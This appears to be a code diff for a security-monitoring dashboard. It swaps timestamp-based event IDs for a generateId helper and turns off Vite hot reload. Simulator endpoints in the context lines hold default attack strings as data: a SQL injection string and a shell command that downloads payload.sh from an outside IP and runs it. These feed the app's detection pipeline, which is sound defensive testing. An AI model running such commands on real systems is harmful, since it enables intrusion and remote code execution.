@@ -5,6 +5,7 @@ import { pipeline, registerSSEListener, broadcast } from './server/pipeline';
 import { cveEngine } from './server/cveEngine';
 import { responseEngine } from './server/responseEngine';
 import { SecurityEvent } from './server/types';
+import { generateId } from './server/idGenerator';
 
 const app = express();
 const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;
@@ -142,7 +143,7 @@ app.post('/api/iocs', (req: Request, res: Response) => {
     return res.status(400).json({ error: 'ioc and type are required' });
   }
   const newIoc = {
-    id: `ioc-${Date.now().toString().slice(-4)}`,
+    id: generateId('ioc'),
     ioc,
     type,
     threat_level: threat_level || 'high',
@@ -206,7 +207,7 @@ app.post('/api/simulator/sql-injection', (req: Request, res: Response) => {
   const customPayload = req.body.payload || "' OR '1'='1 --";
 
   const result = pipeline.processEvent({
-    event_id: `sim-sqli-${Date.now().toString().slice(-4)}`,
+    event_id: generateId('sim-sqli'),
     source: 'web_server',
     source_ip: customIp,
     destination_ip: '10.0.1.25',
@@ -230,7 +231,7 @@ app.post('/api/simulator/rce', (req: Request, res: Response) => {
   const customPayload = req.body.payload || "; /bin/bash -c 'wget http://185.220.101.45/payload.sh -O /tmp/run; chmod +x /tmp/run; /tmp/run'";
 
   const result = pipeline.processEvent({
-    event_id: `sim-rce-${Date.now().toString().slice(-4)}`,
+    event_id: generateId('sim-rce'),
     source: 'endpoint_agent',
     source_ip: customIp,
     destination_ip: '10.0.2.10',
@@ -255,7 +256,7 @@ app.post('/api/simulator/malware', (req: Request, res: Response) => {
   const hash = req.body.hash || '44d88612fea8a8f36de82e1278abb02f';
 
   const result = pipeline.processEvent({
-    event_id: `sim-mal-${Date.now().toString().slice(-4)}`,
+    event_id: generateId('sim-mal'),
     source: 'endpoint_agent',
     source_ip: customIp,
     destination_ip: '10.0.1.80',
@@ -281,7 +282,7 @@ app.post('/api/simulator/brute-force', (req: Request, res: Response) => {
   let lastResult;
   for (let i = 0; i < 4; i++) {
     lastResult = pipeline.processEvent({
-      event_id: `sim-bf-${Date.now().toString().slice(-4)}-${i}`,
+      event_id: generateId(`sim-bf-${i}`),
       source: 'auth_service',
       source_ip: customIp,
       destination_ip: '10.0.1.50',
@@ -307,7 +308,7 @@ app.post('/api/simulator/port-scan', (req: Request, res: Response) => {
   const ports = [21, 22, 80, 443, 3389, 8080];
   for (const port of ports) {
     lastResult = pipeline.processEvent({
-      event_id: `sim-scan-${Date.now().toString().slice(-4)}-${port}`,
+      event_id: generateId(`sim-scan-${port}`),
       source: 'edge_firewall',
       source_ip: customIp,
       destination_ip: '10.0.0.2',
@@ -524,7 +525,10 @@ async function startServer() {
     });
   } else {
     const vite = await createViteServer({
-      server: { middlewareMode: true },
+      server: {
+        middlewareMode: true,
+        hmr: false
+      },
       appType: 'spa'
     });
     app.use(vite.middlewares);
